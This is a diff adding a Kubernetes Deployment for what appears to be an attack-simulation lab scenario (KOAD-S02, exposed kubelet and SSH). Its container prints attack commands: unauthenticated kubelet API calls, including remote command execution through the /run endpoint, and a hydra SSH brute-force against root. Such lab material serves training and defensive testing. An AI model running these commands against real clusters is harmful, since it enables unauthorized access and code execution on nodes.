@@ -1,0 +1,50 @@
+# KOAD-S02: Exposed Kubelet & SSH
+# ATT&CK: T1133 — External Remote Services
+# Attack: kubelet 10250 open + Node SSH with weak password
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: kubelet-probe
+  namespace: koad
+  labels:
+    app: kubelet-probe
+    koad-scenario: S02
+    mitre-attck: T1133
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: kubelet-probe
+  template:
+    metadata:
+      labels:
+        app: kubelet-probe
+        koad-scenario: S02
+    spec:
+      containers:
+        - name: probe
+          image: curlimages/curl:latest
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "=== KOAD-S02: Kubelet Probe ==="
+              echo "Checking kubelet API on node..."
+              echo ""
+              echo "[Attack Vector 1] Unauthenticated kubelet API:"
+              echo "  curl -sk https://\$NODE_IP:10250/pods"
+              echo "  curl -sk https://\$NODE_IP:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'"
+              echo ""
+              echo "[Attack Vector 2] kubelet read-only port:"
+              echo "  curl -s http://\$NODE_IP:10255/pods"
+              echo ""
+              echo "[Attack Vector 3] SSH brute force:"
+              echo "  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://\$NODE_IP"
+              echo ""
+              echo "Probe ready. Use 'kubectl exec' to interact."
+              sleep infinity
+          env:
+            - name: NODE_IP
+              valueFrom:
+                fieldRef:
+                  fieldPath: status.hostIP
